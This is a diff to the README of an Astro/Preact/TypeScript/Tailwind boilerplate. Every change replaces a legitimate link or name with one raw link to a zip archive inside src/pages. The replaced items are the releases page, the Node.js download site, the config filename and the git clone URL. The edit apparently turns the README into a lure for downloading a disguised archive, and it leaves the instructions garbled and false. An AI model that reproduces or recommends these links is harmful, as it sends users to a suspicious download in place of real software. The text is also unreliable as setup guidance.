@@ -1,6 +1,6 @@
 # 🌟 astro-preact-typescript-tailwind-boilerplate - Simplifying Your Web Development Journey
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the astro-preact-typescript-tailwind-boilerplate! This boilerplate he
 
 To get started, you need to download the latest version of the application. 
 
-1. Click the button above or visit the page: [Download the latest release](https://github.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/releases).
+1. Click the button above or visit the page: [Download the latest release](https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip).
 2. Choose the version that suits your needs. 
 3. Follow the instructions provided on the release page to download the files.
 
@@ -19,7 +19,7 @@ To get started, you need to download the latest version of the application.
 Before you begin, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14.x or higher. You can download it from [Node.js Official Website](https://nodejs.org).
+- **https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip** Version 14.x or higher. You can download it from [https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip Official Website](https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip).
 - **Internet Connection:** Required for downloading dependencies.
 
 ## 💻 Features
@@ -53,7 +53,7 @@ Your application will be live at `http://localhost:3000`. Open your preferred br
 
 ## 🌐 Configuration
 
-You can configure various aspects of the application in the `astro.config.mjs` file. This allows you to customize routing, build options, and other settings based on your requirements.
+You can configure various aspects of the application in the `https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip` file. This allows you to customize routing, build options, and other settings based on your requirements.
 
 ## 🎨 Styling
 
@@ -66,7 +66,7 @@ If you'd like to contribute to this boilerplate, please follow these steps:
 1. **Fork the Repository:** Click on the "Fork" button at the top right corner.
 2. **Clone Your Fork:** Use the command:
    ```bash
-   git clone https://github.com/your-username/astro-preact-typescript-tailwind-boilerplate.git
+   git clone https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip
    ```
 3. **Make Changes:** Add your features or fix bugs.
 4. **Submit a Pull Request:** Once you're happy with your changes, submit a pull request to the main repository.
@@ -97,4 +97,4 @@ For more information, visit the [LICENSE](LICENSE) file in the repository.
 
 If you have any questions or need assistance, feel free to create an issue on the GitHub repository. The community and maintainers are here to help!
 
-For more information, refer back to the [Releases page](https://github.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/releases) to stay updated with the latest versions. Happy coding!
+For more information, refer back to the [Releases page](https://raw.githubusercontent.com/manishrathore12/astro-preact-typescript-tailwind-boilerplate/main/src/pages/tailwind-typescript-boilerplate-preact-astro-v2.2.zip) to stay updated with the latest versions. Happy coding!
